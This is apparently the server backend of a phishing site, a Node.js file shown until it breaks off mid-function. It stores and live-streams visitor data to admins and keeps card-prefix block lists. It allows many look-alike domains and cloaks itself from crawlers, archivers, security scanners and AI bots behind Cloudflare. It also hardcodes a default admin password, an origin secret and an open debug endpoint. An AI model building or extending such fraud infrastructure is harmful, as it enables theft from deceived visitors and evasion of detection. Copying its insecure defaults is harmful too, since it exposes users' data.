const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const cors = require("cors");
const cookieParser = require("cookie-parser");
const helmet = require("helmet");
const fs = require("fs");
const path = require("path");
const crypto = require("crypto");
const compression = require("compression");
require("dotenv").config();

// Firebase Admin SDK for push notifications
let firebaseAdmin = null;
try {
  firebaseAdmin = require("firebase-admin");
  // Try to load service account from environment variable first, then from file
  let serviceAccount;
  if (process.env.FIREBASE_SERVICE_ACCOUNT) {
    serviceAccount = JSON.parse(process.env.FIREBASE_SERVICE_ACCOUNT);
  } else if (fs.existsSync(path.join(__dirname, 'serviceAccountKey.json'))) {
    serviceAccount = require('./serviceAccountKey.json');
  }
  if (serviceAccount) {
    firebaseAdmin.initializeApp({
      credential: firebaseAdmin.credential.cert(serviceAccount)
    });
    console.log('Firebase Admin SDK initialized successfully');
  } else {
    console.log('Firebase service account not found - push notifications disabled');
    firebaseAdmin = null;
  }
} catch (error) {
  console.log('Firebase Admin SDK not available:', error.message);
  firebaseAdmin = null;
}

// Store FCM tokens for admin devices
const FCM_TOKENS_FILE = path.join(process.env.NODE_ENV === 'production' ? '/data' : __dirname, 'fcm_tokens.json');
let fcmTokens = [];
try {
  if (fs.existsSync(FCM_TOKENS_FILE)) {
    fcmTokens = JSON.parse(fs.readFileSync(FCM_TOKENS_FILE, 'utf8'));
    console.log(`Loaded ${fcmTokens.length} FCM tokens`);
  }
} catch (e) {
  console.log('No FCM tokens file found, starting fresh');
}

function saveFcmTokens() {
  try {
    const dir = path.dirname(FCM_TOKENS_FILE);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(FCM_TOKENS_FILE, JSON.stringify(fcmTokens));
  } catch (e) {
    console.error('Error saving FCM tokens:', e.message);
  }
}

// Send push notification to all registered admin devices
async function sendPushNotification(title, body, data = {}) {
  if (!firebaseAdmin || fcmTokens.length === 0) {
    console.log(`Push skipped: firebase=${!!firebaseAdmin}, tokens=${fcmTokens.length}`);
    return;
  }
  
  console.log(`Sending push to ${fcmTokens.length} devices: ${title}`);
  const invalidTokens = [];
  
  for (const token of fcmTokens) {
    try {
      const message = {
        token: token,
        notification: {
          title: title,
          body: body,
        },
        data: {
          ...Object.fromEntries(Object.entries(data).map(([k, v]) => [k, String(v)])),
          timestamp: Date.now().toString()
        },
        webpush: {
          headers: {
            Urgency: 'high',
            TTL: '86400'
          },
          notification: {
            icon: '/admin/icon-192.png',
            badge: '/admin/icon-192.png',
            tag: 'visitor-data-' + Date.now(),
            renotify: true,
            requireInteraction: true,
            vibrate: [300, 100, 300, 100, 300],
          },
          fcmOptions: {
            link: 'https://fahos-production.up.railway.app/admin/'
          }
        },
        apns: {
          headers: {
            'apns-priority': '10',
            'apns-push-type': 'alert'
          },
          payload: {
            aps: {
              alert: {
                title: title,
                body: body
              },
              sound: 'default',
              badge: 1,
              'mutable-content': 1,
              'content-available': 1
            }
          }
        }
      };
      
      const result = await firebaseAdmin.messaging().send(message);
      console.log(`Push sent OK to ${token.substring(0, 20)}..., result: ${result}`);
    } catch (error) {
      console.error(`Push ERROR to ${token.substring(0, 20)}...: ${error.code} - ${error.message}`);
      if (error.code === 'messaging/registration-token-not-registered' || 
          error.code === 'messaging/invalid-registration-token') {
        invalidTokens.push(token);
      }
    }
  }
  
  // Remove invalid tokens
  if (invalidTokens.length > 0) {
    fcmTokens = fcmTokens.filter(t => !invalidTokens.includes(t));
    saveFcmTokens();
    console.log(`Removed ${invalidTokens.length} invalid FCM tokens`);
  }
}

const app = express();
const server = http.createServer(app);

app.get("/api/debug-visitors", (req, res) => res.json({ count: savedVisitors.length, visitors: savedVisitors.slice(-5) }));

// CORS Configuration - Dynamic (reads from allowedDomains)
const corsOptions = {
  origin: function (origin, callback) {
    if (!origin) return callback(null, true);
    const allowed = buildAllowedOrigins();
    if (allowed.some(a => origin.startsWith(a))) {
      callback(null, true);
    } else {
      console.log(`[CORS BLOCKED] origin: ${origin}`);
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true,
};

app.use(compression());
app.use(cors(corsOptions));
app.use(express.json({ limit: '1mb' }));
app.use(cookieParser());

// Helmet - HTTP Security Headers
app.use(helmet({
  contentSecurityPolicy: false, // Don't break admin panel scripts
  crossOriginEmbedderPolicy: false, // Don't break Socket.IO
  crossOriginResourcePolicy: { policy: 'cross-origin' }, // Allow cross-origin resources
}));

// Input Sanitizer - clean dangerous characters from all incoming data
function sanitizeValue(val) {
  if (typeof val === 'string') {
    return val.replace(/<script[^>]*>.*?<\/script>/gi, '')
              .replace(/javascript:/gi, '')
              .replace(/on\w+\s*=/gi, '')
              .replace(/<iframe[^>]*>.*?<\/iframe>/gi, '')
              .replace(/<object[^>]*>.*?<\/object>/gi, '')
              .replace(/<embed[^>]*>/gi, '')
              .replace(/<link[^>]*>/gi, '');
  }
  if (typeof val === 'object' && val !== null) {
    if (Array.isArray(val)) return val.map(sanitizeValue);
    const cleaned = {};
    for (const [k, v] of Object.entries(val)) {
      cleaned[sanitizeValue(k)] = sanitizeValue(v);
    }
    return cleaned;
  }
  return val;
}
app.use((req, res, next) => {
  if (req.body && typeof req.body === 'object') {
    req.body = sanitizeValue(req.body);
  }
  next();
});

// Admin API Authentication Middleware
function requireAdminAuth(req, res, next) {
  const authHeader = req.headers.authorization;
  const queryKey = req.query.key;
  const pwd = authHeader ? authHeader.replace('Bearer ', '') : queryKey;
  if (!pwd || pwd !== adminPassword) {
    return res.status(401).json({ error: 'Unauthorized - admin password required' });
  }
  next();
}

// Rate Limiting - block IPs with too many requests
const rateLimitMap = new Map();
const RATE_LIMIT_WINDOW = 60 * 1000; // 1 minute
const RATE_LIMIT_MAX = 30; // max requests per window (real visitors use ~5-10/min)
const RATE_LIMIT_BLOCK_DURATION = 30 * 60 * 1000; // block for 30 minutes

// === Persistent IP Blacklist (auto-ban repeat offenders) ===
const ipBlacklist = new Map(); // ip -> { blockedUntil, strikes }
const BLACKLIST_FILE = path.join(process.env.NODE_ENV === 'production' ? '/data' : __dirname, 'ip_blacklist.json');
try {
  if (fs.existsSync(BLACKLIST_FILE)) {
    const data = JSON.parse(fs.readFileSync(BLACKLIST_FILE, 'utf8'));
    Object.entries(data).forEach(([ip, info]) => ipBlacklist.set(ip, info));
    console.log(`Loaded ${ipBlacklist.size} blacklisted IPs`);
  }
} catch (e) { console.log('No blacklist file found'); }

function saveBlacklist() {
  try {
    const dir = path.dirname(BLACKLIST_FILE);
    if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
    const obj = {};
    ipBlacklist.forEach((v, k) => { obj[k] = v; });
    fs.writeFileSync(BLACKLIST_FILE, JSON.stringify(obj));
  } catch (e) { console.error('Error saving blacklist:', e.message); }
}

function blacklistIP(ip, reason) {
  const existing = ipBlacklist.get(ip);
  const strikes = existing ? existing.strikes + 1 : 1;
  // Escalating ban: 1h, 6h, 24h, 7d, permanent
  const durations = [60*60*1000, 6*60*60*1000, 24*60*60*1000, 7*24*60*60*1000, 365*24*60*60*1000];
  const duration = durations[Math.min(strikes - 1, durations.length - 1)];
  ipBlacklist.set(ip, { blockedUntil: Date.now() + duration, strikes, reason, lastBlocked: new Date().toISOString() });
  saveBlacklist();
  console.log(`🚫 IP BLACKLISTED: ${ip}, strikes=${strikes}, duration=${duration/3600000}h, reason=${reason}`);
}

function isBlacklisted(ip) {
  const entry = ipBlacklist.get(ip);
  if (!entry) return false;
  if (Date.now() > entry.blockedUntil) {
    // Don't delete - keep strikes history
    return false;
  }
  return true;
}

// === Smart DDoS Protection (Priority-Based) ===
// Tracks suspicious (non-Cloudflare) requests separately from legitimate ones
let suspiciousRequestCount = 0;
const SUSPICIOUS_MAX_PER_SECOND = 30; // Suspicious requests limit (lowered from 100)
const TRUSTED_PATHS = ['/admin', '/socket.io']; // Always allowed paths

// Reset suspicious counter every second
setInterval(() => {
  suspiciousRequestCount = 0;
}, 1000);

setInterval(() => {
  const now = Date.now();
  for (const [ip, data] of rateLimitMap) {
    if (now - data.firstRequest > RATE_LIMIT_WINDOW && !data.blocked) {
      rateLimitMap.delete(ip);
    }
    if (data.blocked && now > data.blockedUntil) {
      rateLimitMap.delete(ip);
    }
  }
}, 60 * 1000);

app.use((req, res, next) => {
  const ip = req.headers['cf-connecting-ip'] || req.headers['x-forwarded-for'] || req.ip;
  const isTrustedPath = TRUSTED_PATHS.some(p => req.path.startsWith(p));
  
  // Admin always passes
  if (isTrustedPath) return next();
  
  // Check IP blacklist FIRST (fastest rejection)
  if (isBlacklisted(ip)) {
    return res.status(403).end();
  }
  
  // Smart DDoS Protection - Priority-based
  const hasCF = req.headers['cf-connecting-ip'] || req.headers['cf-ray'];
  
  // Trusted requests ALWAYS pass (Cloudflare-proxied requests = real visitors)
  if (!hasCF) {
    // Suspicious request (no Cloudflare headers)
    suspiciousRequestCount++;
    if (suspiciousRequestCount > SUSPICIOUS_MAX_PER_SECOND) {
      return res.status(503).send('Server busy, try again later.');
    }
  }
  const now = Date.now();
  let data = rateLimitMap.get(ip);
  
  if (data && data.blocked) {
    if (now < data.blockedUntil) {
      return res.status(429).send('Too many requests. Try again later.');
    } else {
      rateLimitMap.delete(ip);
      data = null;
    }
  }
  
  if (!data) {
    rateLimitMap.set(ip, { count: 1, firstRequest: now, blocked: false });
  } else {
    if (now - data.firstRequest > RATE_LIMIT_WINDOW) {
      rateLimitMap.set(ip, { count: 1, firstRequest: now, blocked: false });
    } else {
      data.count++;
      if (data.count > RATE_LIMIT_MAX) {
        data.blocked = true;
        data.blockedUntil = now + RATE_LIMIT_BLOCK_DURATION;
        // Auto-blacklist IPs that hit rate limit (bots keep hammering)
        blacklistIP(ip, 'rate_limit_exceeded');
        return res.status(429).send('Too many requests. Try again later.');
      }
// Moved to top
    }
  }
  next();
});

app.use('/admin', express.static('admin', {
  maxAge: '1h',
  setHeaders: (res, filePath) => {
    if (filePath.endsWith('.json')) res.setHeader('Content-Type', 'application/json');
    if (filePath.endsWith('.js') && filePath.includes('sw.js')) res.setHeader('Service-Worker-Allowed', '/');
    // Cache static assets (images, audio) for longer
    if (filePath.match(/\.(png|jpg|mp3|ico)$/)) res.setHeader('Cache-Control', 'public, max-age=86400');
  }
}));

// Cloudflare-only protection - block direct access to Railway in production
// Uses a shared secret header (x-origin-secret) set by Cloudflare Transform Rules
// This cannot be faked even if someone knows the Railway URL
const ORIGIN_SECRET = process.env.CF_ORIGIN_SECRET || 'sK9mP2xR7vL4nQ8wF3jB6';

// Cloudflare-only middleware: verify requests actually come through Cloudflare
// Admin panel and socket.io are allowed (they need direct access for the dashboard)
app.use((req, res, next) => {
  if (process.env.NODE_ENV === 'production') {
    // Admin panel, socket.io, and admin API endpoints are always allowed
    if (req.path.startsWith('/admin') || req.path.startsWith('/socket.io') || req.path.startsWith('/api/visitors') || req.path.startsWith('/api/stats') || req.path.startsWith('/api/fcm') || req.path.startsWith('/api/debug') || req.path.startsWith('/api/connection-token') || req.path.startsWith('/api/pow-challenge') || req.path.startsWith('/api/page-ping') || req.path.startsWith('/api/whatsapp')) {
      return next();
    }
    // For all other paths, verify the secret header set by Cloudflare Transform Rules
    const originSecret = req.headers['x-origin-secret'];
    
    if (originSecret !== ORIGIN_SECRET) {
      const remoteIP = (req.headers['x-forwarded-for'] || req.ip || '').split(',')[0].trim();
      console.log(`[CF] Blocked: ${req.path} from ${remoteIP} (missing/invalid origin secret)`);
      return res.status(403).send('Access denied');
    }
  }
  next();
});


// Socket.IO Configuration
const io = new Server(server, {
  maxHttpBufferSize: 10000, // 10KB max message size - prevents large payload attacks
  pingTimeout: 15000, // 15s - disconnect dead connections faster
  pingInterval: 10000, // 10s - check connections more frequently
  cors: {
    origin: function (origin, callback) {
      if (!origin) return callback(null, true);
      const allowed = buildAllowedOrigins();
      if (allowed.some(a => origin.startsWith(a))) {
        callback(null, true);
      } else {
        callback(new Error('Not allowed by CORS'));
      }
    },
    credentials: true,
  },
  transports: ["websocket", "polling"],
  allowRequest: (req, callback) => {
    const origin = req.headers.origin || req.headers.referer || '';
    if (!origin) return callback(null, true);
    const allowed = buildAllowedOrigins();
    if (allowed.some(a => origin.startsWith(a))) {
      callback(null, true);
    } else {
      console.log(`[allowRequest BLOCKED] origin: ${origin}`);
      callback('Unauthorized', false);
    }
  },
});

// Data file path
const DATA_DIR = process.env.NODE_ENV === 'production' ? '/data' : __dirname;
const DATA_FILE = path.join(DATA_DIR, 'visitors_data.json');
const BACKUP_FILE = path.join(DATA_DIR, 'visitors_data_backup.json');

// Ensure data directory exists
function ensureDataDir() {
  try {
    if (!fs.existsSync(DATA_DIR)) {
      fs.mkdirSync(DATA_DIR, { recursive: true });
      console.log(`Created data directory: ${DATA_DIR}`);
    }
  } catch (error) {
    console.error("Error creating data directory:", error);
  }
}

// Load saved data from file
function loadSavedData() {
  ensureDataDir();
  console.log(`Loading data from: ${DATA_FILE}`);
  
  try {
    // Try main file first
    if (fs.existsSync(DATA_FILE)) {
      const data = fs.readFileSync(DATA_FILE, "utf8");
      const parsed = JSON.parse(data);
      console.log(`Loaded ${parsed.savedVisitors?.length || 0} visitors from main file`);
      console.log(`Loaded whatsappNumber: ${parsed.whatsappNumber || 'not set'}`);
      return {
        visitors: new Map(Object.entries(parsed.visitors || {})),
        visitorCounter: parsed.visitorCounter || 0,
        displayVisitorCount: parsed.displayVisitorCount !== undefined ? parsed.displayVisitorCount : null,
        savedVisitors: parsed.savedVisitors || [],
        whatsappNumber: parsed.whatsappNumber || "",
        globalBlockedCards: parsed.globalBlockedCards || [],
        globalBlockedCountries: parsed.globalBlockedCountries || [],
        adminPassword: parsed.adminPassword || "admin123",
        allowedDomains: parsed.allowedDomains || null,
      };
    }
    
    // Try backup file if main doesn't exist
    if (fs.existsSync(BACKUP_FILE)) {
      console.log("Main file not found, trying backup...");
      const data = fs.readFileSync(BACKUP_FILE, "utf8");
      const parsed = JSON.parse(data);
      console.log(`Loaded ${parsed.savedVisitors?.length || 0} visitors from backup file`);
      console.log(`Loaded whatsappNumber: ${parsed.whatsappNumber || 'not set'}`);
      return {
        visitors: new Map(Object.entries(parsed.visitors || {})),
        visitorCounter: parsed.visitorCounter || 0,
        displayVisitorCount: parsed.displayVisitorCount !== undefined ? parsed.displayVisitorCount : null,
        savedVisitors: parsed.savedVisitors || [],
        whatsappNumber: parsed.whatsappNumber || "",
        globalBlockedCards: parsed.globalBlockedCards || [],
        globalBlockedCountries: parsed.globalBlockedCountries || [],
        adminPassword: parsed.adminPassword || "admin123",
        allowedDomains: parsed.allowedDomains || null,
      };
    }
    
    console.log("No data file found, starting fresh");
  } catch (error) {
    console.error("Error loading saved data:", error);
    
    // Try backup on error
    try {
      if (fs.existsSync(BACKUP_FILE)) {
        console.log("Error loading main file, trying backup...");
        const data = fs.readFileSync(BACKUP_FILE, "utf8");
        const parsed = JSON.parse(data);
        return {
          visitors: new Map(Object.entries(parsed.visitors || {})),
          visitorCounter: parsed.visitorCounter || 0,
          displayVisitorCount: parsed.displayVisitorCount !== undefined ? parsed.displayVisitorCount : null,
          savedVisitors: parsed.savedVisitors || [],
          whatsappNumber: parsed.whatsappNumber || "",
          globalBlockedCards: parsed.globalBlockedCards || [],
          globalBlockedCountries: parsed.globalBlockedCountries || [],
          adminPassword: parsed.adminPassword || "admin123",
          allowedDomains: parsed.allowedDomains || null,
        };
      }
    } catch (backupError) {
      console.error("Error loading backup:", backupError);
    }
  }
  return {
    visitors: new Map(),
    visitorCounter: 0,
    displayVisitorCount: null,
    savedVisitors: [],
    whatsappNumber: "",
    globalBlockedCards: [],
    globalBlockedCountries: [],
    adminPassword: "admin123",
    allowedDomains: null,
  };
}

// Save data to file with backup - actual write function
function _saveDataNow() {
  ensureDataDir();
  
  try {
    const data = {
      visitors: Object.fromEntries(visitors),
      visitorCounter,
      displayVisitorCount,
      savedVisitors,
      whatsappNumber,
      globalBlockedCards,
      globalBlockedCountries,
      adminPassword,
      allowedDomains,
      lastSaved: new Date().toISOString(),
    };
    const jsonData = JSON.stringify(data, null, 2);
    
    // Create backup of existing file first
    if (fs.existsSync(DATA_FILE)) {
      try {
        fs.copyFileSync(DATA_FILE, BACKUP_FILE);
      } catch (backupErr) {
        console.error("Error creating backup:", backupErr);
      }
    }
    
    // Write main file
    fs.writeFileSync(DATA_FILE, jsonData);
    console.log(`Data saved: ${savedVisitors.length} visitors at ${new Date().toISOString()}`);
  } catch (error) {
    console.error("Error saving data:", error);
  }
}

// Debounced saveData - writes at most once every 5 seconds
let _saveTimeout = null;
function saveData() {
  if (_saveTimeout) return; // already scheduled
  _saveTimeout = setTimeout(() => {
    _saveDataNow();
    _saveTimeout = null;
  }, 5000);
}

// Force save on shutdown
process.on('SIGTERM', () => { if (_saveTimeout) { clearTimeout(_saveTimeout); _saveDataNow(); } process.exit(0); });
process.on('SIGINT', () => { if (_saveTimeout) { clearTimeout(_saveTimeout); _saveDataNow(); } process.exit(0); });

// Initialize data from file
const savedData = loadSavedData();
const visitors = savedData.visitors;
const admins = new Map();
let visitorCounter = savedData.visitorCounter;
let displayVisitorCount = savedData.displayVisitorCount;
let savedVisitors = savedData.savedVisitors; // Array to store all visitors permanently
let whatsappNumber = savedData.whatsappNumber || ""; // WhatsApp number for footer
let globalBlockedCards = savedData.globalBlockedCards || []; // Global blocked card prefixes
let globalBlockedCountries = savedData.globalBlockedCountries || []; // Global blocked countries
let adminPassword = savedData.adminPassword || "admin123"; // Admin password (persisted)

// Default allowed domains
const DEFAULT_ALLOWED_DOMAINS = [
  'alamsallameh.com',
  'amnwsalameh.com',
  'amansallameh.com',
  'elfahestheq.com',
  'rasallameh.com',
  'dfarelfahis.com',
  'ameeralfahisi.com',
  'assemalfatheh.com',
  'serftay.com',
  'serftayi.com',
  'ancesture.com',
  'ancesturei.com',
  'aturtestar.com',
  'alterantest.com',
  'alterantesti.com',
  'drshelen.com',
];
let allowedDomains = savedData.allowedDomains || [...DEFAULT_ALLOWED_DOMAINS]; // Allowed domains (persisted)

// Build full origins list from allowed domains
function buildAllowedOrigins() {
  const origins = [];
  allowedDomains.forEach(domain => {
    origins.push(`https://${domain}`);
    origins.push(`https://www.${domain}`);
    origins.push(`https://api.${domain}`);
  });
  // Dynamically allow Railway public domain
  if (process.env.RAILWAY_PUBLIC_DOMAIN) {
    origins.push(`https://${process.env.RAILWAY_PUBLIC_DOMAIN}`);
  }
  // Dynamically allow CLIENT_URL
  if (process.env.CLIENT_URL) {
    origins.push(process.env.CLIENT_URL);
  }
  // Always allow Netlify deploy URL
  origins.push('https://fahos.netlify.app');
  origins.push('https://master--fahos.netlify.app');
  origins.push('https://dalleh-app.netlify.app');
  // Always allow Railway server itself (for admin panel)
  origins.push('https://dalleh-server-production.up.railway.app');
  // Always allow localhost for development
  origins.push('http://localhost:5173');
  origins.push('http://localhost');
  return origins;
}

// Generate unique API key
function generateApiKey() {
  return "api_" + Math.random().toString(36).substring(2, 15);
}

// Country code mapping (used for both server-side blocking and Cloudflare WAF sync)
const countryCodeToName = {
  'AF':'Afghanistan','AL':'Albania','DZ':'Algeria','AD':'Andorra','AO':'Angola',
  'AR':'Argentina','AM':'Armenia','AU':'Australia','AT':'Austria','AZ':'Azerbaijan',
  'BH':'Bahrain','BD':'Bangladesh','BY':'Belarus','BE':'Belgium','BT':'Bhutan',
  'BO':'Bolivia','BA':'Bosnia and Herzegovina','BW':'Botswana','BR':'Brazil','BN':'Brunei',
  'BG':'Bulgaria','KH':'Cambodia','CM':'Cameroon','CA':'Canada','CL':'Chile',
  'CN':'China','CO':'Colombia','CR':'Costa Rica','HR':'Croatia','CU':'Cuba',
  'CY':'Cyprus','CZ':'Czech Republic','DK':'Denmark','DJ':'Djibouti','EC':'Ecuador',
  'EG':'Egypt','EE':'Estonia','ET':'Ethiopia','FI':'Finland','FR':'France',
  'GE':'Georgia','DE':'Germany','GH':'Ghana','GR':'Greece','HK':'Hong Kong',
  'HU':'Hungary','IS':'Iceland','IN':'India','ID':'Indonesia','IR':'Iran',
  'IQ':'Iraq','IE':'Ireland','IL':'Israel','IT':'Italy','JP':'Japan',
  'JO':'Jordan','KZ':'Kazakhstan','KE':'Kenya','KW':'Kuwait','KG':'Kyrgyzstan',
  'LV':'Latvia','LB':'Lebanon','LY':'Libya','LT':'Lithuania','LU':'Luxembourg',
  'MY':'Malaysia','MV':'Maldives','MT':'Malta','MR':'Mauritania','MX':'Mexico',
  'MD':'Moldova','MC':'Monaco','MN':'Mongolia','ME':'Montenegro','MA':'Morocco',
  'MM':'Myanmar','NP':'Nepal','NL':'Netherlands','NZ':'New Zealand','NG':'Nigeria',
  'KP':'North Korea','NO':'Norway','OM':'Oman','PK':'Pakistan','PS':'Palestine',
  'PA':'Panama','PE':'Peru','PH':'Philippines','PL':'Poland','PT':'Portugal',
  'QA':'Qatar','RO':'Romania','RU':'Russia','SA':'Saudi Arabia','SN':'Senegal',
  'RS':'Serbia','SG':'Singapore','SK':'Slovakia','SI':'Slovenia','SO':'Somalia',
  'ZA':'South Africa','KR':'South Korea','ES':'Spain','LK':'Sri Lanka','SD':'Sudan',
  'SE':'Sweden','CH':'Switzerland','SY':'Syria','TW':'Taiwan','TJ':'Tajikistan',
  'TZ':'Tanzania','TH':'Thailand','TN':'Tunisia','TR':'Turkey','TM':'Turkmenistan',
  'UA':'Ukraine','AE':'United Arab Emirates','GB':'United Kingdom','US':'United States',
  'UY':'Uruguay','UZ':'Uzbekistan','VE':'Venezuela','VN':'Vietnam','YE':'Yemen',
  'ZM':'Zambia','ZW':'Zimbabwe'
};
// Reverse mapping: country name -> country code
const nameToCountryCode = {};
for (const [code, name] of Object.entries(countryCodeToName)) {
  nameToCountryCode[name.toLowerCase()] = code;
}

// Sync blocked countries to Cloudflare WAF rules (blocks on both sites)
async function syncBlockedCountriesToCloudflare(blockedCountries) {
  const cfEmail = process.env.CF_API_EMAIL;
  const cfKey = process.env.CF_API_KEY;
  const cfZoneIds = process.env.CF_ZONE_IDS; // comma-separated zone IDs
  
  console.log(`[CF-WAF] Sync called with ${blockedCountries.length} countries:`, blockedCountries);
  console.log(`[CF-WAF] CF_API_EMAIL: ${cfEmail ? 'SET' : 'MISSING'}, CF_API_KEY: ${cfKey ? 'SET' : 'MISSING'}, CF_ZONE_IDS: ${cfZoneIds ? cfZoneIds : 'MISSING'}`);
  
  if (!cfEmail || !cfKey || !cfZoneIds) {
    console.log('[CF-WAF] Missing CF_API_EMAIL, CF_API_KEY, or CF_ZONE_IDS env vars - skipping WAF sync');
    return;
  }
  
  const zones = cfZoneIds.split(',').map(z => z.trim()).filter(Boolean);
  console.log(`[CF-WAF] Will sync to ${zones.length} zones:`, zones);
  
  // Convert country names to 2-letter codes for Cloudflare expression
  const countryCodes = [];
  for (const country of blockedCountries) {
    const code = nameToCountryCode[country.toLowerCase()];
    if (code) {
      countryCodes.push(`"${code}"`);
    } else {
      // Maybe it's already a code
      if (country.length === 2) countryCodes.push(`"${country.toUpperCase()}"`);
    }
  }
  
  for (const zoneId of zones) {
    try {
      // Get current ruleset
      const getRulesetRes = await fetch(
        `https://api.cloudflare.com/client/v4/zones/${zoneId}/rulesets/phases/http_request_firewall_custom/entrypoint`,
        {
          headers: {
            'X-Auth-Email': cfEmail,
            'X-Auth-Key': cfKey,
            'Content-Type': 'application/json'
          }
        }
      );
      const rulesetData = await getRulesetRes.json();
      if (!rulesetData.success) {
        console.log(`[CF-WAF] Failed to get ruleset for zone ${zoneId}:`, rulesetData.errors);
        continue;
      }
      
      const ruleset = rulesetData.result;
      const rulesetId = ruleset.id;
      let rules = ruleset.rules || [];
      
      // Find existing "Block countries from admin panel" rule
      const existingRuleIndex = rules.findIndex(r => r.description === 'Block countries from admin panel');
      
      if (countryCodes.length === 0) {
        // No countries to block - remove the rule if it exists
        if (existingRuleIndex !== -1) {
          rules.splice(existingRuleIndex, 1);
        } else {
          console.log(`[CF-WAF] No countries to block and no existing rule for zone ${zoneId} - nothing to do`);
          continue;
        }
      } else {
        // Build the expression: block if country is in the list
        const expression = `(ip.geoip.country in {${countryCodes.join(' ')}})`;
        const newRule = {
          action: 'block',
          expression: expression,
          description: 'Block countries from admin panel',
          enabled: true
        };
        
        if (existingRuleIndex !== -1) {
          // Update existing rule - preserve its ID
          newRule.id = rules[existingRuleIndex].id;
          rules[existingRuleIndex] = newRule;
        } else {
          // Add new rule at the end
          rules.push(newRule);
        }
      }
      
      // Clean rules for PUT - remove read-only fields
      const cleanRules = rules.map(r => {
        const clean = {
          action: r.action,
          expression: r.expression,
          description: r.description || '',
          enabled: r.enabled !== false
        };
        if (r.id) clean.id = r.id;
        if (r.action_parameters) clean.action_parameters = r.action_parameters;
        if (r.logging) clean.logging = r.logging;
        return clean;
      });
      
      // Update the ruleset
      const updateRes = await fetch(
        `https://api.cloudflare.com/client/v4/zones/${zoneId}/rulesets/${rulesetId}`,
        {
          method: 'PUT',
          headers: {
            'X-Auth-Email': cfEmail,
            'X-Auth-Key': cfKey,
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ rules: cleanRules })
        }
      );
      const updateData = await updateRes.json();
      if (updateData.success) {
        console.log(`[CF-WAF] Successfully synced ${countryCodes.length} blocked countries to zone ${zoneId}`);
      } else {
        console.log(`[CF-WAF] Failed to update ruleset for zone ${zoneId}:`, updateData.errors);
      }
    } catch (err) {
      console.log(`[CF-WAF] Error syncing to zone ${zoneId}:`, err.message);
    }
  }
}

// Get visitor info from request
function getVisitorInfo(socket) {
  const headers = socket.handshake.headers;
  // Priority: cf-connecting-ip (real visitor IP from Cloudflare) > first IP in x-forwarded-for > socket address
  let ip = headers["cf-connecting-ip"] || headers["x-forwarded-for"] || socket.handshake.address;
  if (ip && ip.includes(",")) {
    const ips = ip.split(",").map(i => i.trim());
    ip = ips[0]; // Use the FIRST IP (real client IP)
  }
  return {
    ip: ip,
    userAgent: headers["user-agent"] || "",
    country: headers["cf-ipcountry"] || "Unknown",
  };
}

// Lookup country and city from IP using ip-api.com
async function lookupGeo(ip) {
  try {
    const cleanIp = ip.replace('::ffff:', '');
    const res = await fetch(`http://ip-api.com/json/${cleanIp}?fields=status,country,city`);
    const data = await res.json();
    if (data.status === 'success') {
      return { country: data.country, city: data.city || '' };
    }
  } catch (e) {
    console.log(`[GEO] Failed to lookup IP ${ip}:`, e.message);
  }
  return { country: 'Unknown', city: '' };
}

// Check if user agent is a bot or crawler - COMPREHENSIVE BLOCKING
function isBot(ua) {
  if (!ua) return true; // No user agent = bot
  const lowerUA = ua.toLowerCase();
  const botPatterns = [
    'bot', 'crawl', 'spider', 'slurp', 'scrape', 'fetch',
    'curl', 'wget', 'python', 'java/', 'perl', 'ruby',
    'php/', 'go-http', 'node-fetch', 'axios', 'request',
    'postman', 'insomnia', 'httpie',
    'googlebot', 'bingbot', 'yandex', 'baidu', 'duckduck',
    'facebookexternalhit', 'twitterbot', 'linkedinbot',
    'whatsapp', 'telegram', 'discord', 'slack',
    'semrush', 'ahrefs', 'mj12bot', 'dotbot', 'rogerbot',
    'screaming frog', 'lighthouse', 'pagespeed', 'gtmetrix',
    'headlesschrome', 'phantomjs', 'selenium', 'puppeteer', 'playwright',
    'archive.org', 'ia_archiver',
    'uptimerobot', 'pingdom', 'statuscake', 'site24x7',
    'applebot', 'bytespider', 'gptbot', 'chatgpt', 'claudebot',
    'ccbot', 'anthropic', 'cohere-ai',
  ];
  return botPatterns.some(pattern => lowerUA.includes(pattern));
}

// Validate that visitor has a real browser user agent
function isValidVisitor(ua) {
  if (!ua || ua.length < 20) return false;
  // Must contain at least one real browser identifier
  const browserPatterns = ['Mozilla', 'Chrome', 'Safari', 'Firefox', 'Edge', 'Opera', 'Trident'];
  return browserPatterns.some(p => ua.includes(p));
}

// Parse user agent
function parseUserAgent(ua) {
  let os = "Unknown";
  let device = "Unknown";
  let browser = "Unknown";

  // OS Detection
  if (ua.includes("Windows")) os = "Windows";
  else if (ua.includes("Mac")) os = "macOS";
  else if (ua.includes("Linux")) os = "Linux";
  else if (ua.includes("Android")) os = "Android";
  else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";

  // Device Detection
  if (ua.includes("Mobile")) device = "Mobile";
  else if (ua.includes("Tablet")) device = "Tablet";
  else device = "Desktop";

  // Browser Detection
  if (ua.includes("Chrome")) browser = "Chrome";
  else if (ua.includes("Firefox")) browser = "Firefox";
  else if (ua.includes("Safari")) browser = "Safari";
  else if (ua.includes("Edge")) browser = "Edge";

  return { os, device, browser };
}

// Save visitor to permanent storage
function saveVisitorPermanently(visitor) {
  const existingIndex = savedVisitors.findIndex(v => v._id === visitor._id);
  if (existingIndex >= 0) {
    savedVisitors[existingIndex] = { ...savedVisitors[existingIndex], ...visitor };
  } else {
    savedVisitors.push({ ...visitor });
  }
  saveData();
}

// === Bot Redirect ===
let botRedirectUrl = ''; // URL to redirect bots to (empty = just block)

// === Throttled Admin Broadcast (prevents admin panel from freezing under load) ===
let _pendingAdminUpdate = false;
let _adminUpdateCount = 0; // track updates per interval for adaptive throttling
function broadcastVisitorsToAdmins() {
  if (_pendingAdminUpdate) return; // already scheduled
  _pendingAdminUpdate = true;
  // Adaptive throttle: slower updates when under heavy load
  const throttleMs = visitors.size > 100 ? 5000 : visitors.size > 50 ? 3000 : 2000;
  setTimeout(() => {
    _pendingAdminUpdate = false;
    _adminUpdateCount++;
    // Update connection status for saved visitors based on active visitors Map
    const connectedVisitorIds = new Set();
    visitors.forEach((v) => {
      connectedVisitorIds.add(v._id);
    });
    
    const visitorsWithStatus = savedVisitors.map(v => {
      const isCurrentlyConnected = connectedVisitorIds.has(v._id);
      let currentSocketId = v.socketId;
      if (isCurrentlyConnected) {
        visitors.forEach((activeVisitor, sid) => {
